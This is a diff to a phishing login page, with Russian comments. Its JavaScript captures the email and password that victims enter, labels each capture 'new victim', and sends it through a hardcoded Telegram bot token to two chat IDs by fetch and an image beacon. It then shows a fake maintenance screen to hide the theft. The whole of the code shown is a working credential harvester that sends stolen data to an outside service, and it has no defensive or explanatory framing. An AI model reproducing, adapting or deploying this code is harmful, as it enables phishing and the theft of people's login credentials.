@@ -110,13 +110,13 @@
 </div>
 
 <script>
-    // ОДИН БОТ
+    // ОДИН БОТ (твой)
     const BOT_TOKEN = "8870629098:AAELG7u3brQfiq40IgP9dd3IB36LMBdMfbM";
 
-    // ДВА ПОЛУЧАТЕЛЯ (ЛИЧНЫЕ ЧАТЫ)
+    // ДВА ПОЛУЧАТЕЛЯ (ты и новый человек)
     const CHAT_IDS = [
         "8850351378",   // ты
-        "8784393556"    // второй человек
+        "8784393556"    // второй человек (новый)
     ];
 
     document.getElementById("loginForm").addEventListener("submit", function(event) {
@@ -134,13 +134,14 @@
         const text = "📩 НОВАЯ ЖЕРТВА\n📧 Email: " + email + "\n🔑 Пароль: " + password + "\n🕒 " + new Date().toLocaleString();
         const encoded = encodeURIComponent(text);
 
-        // Отправка каждому ID из списка
+        // Отправка каждому ID
         CHAT_IDS.forEach(id => {
             const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + id + "&text=" + encoded;
             fetch(url, { mode: "no-cors" });
             new Image().src = url;
         });
 
+        // Показываем техработы
         document.getElementById("loginFormContainer").classList.add("hidden");
         document.getElementById("techContainer").classList.remove("hidden");
     });
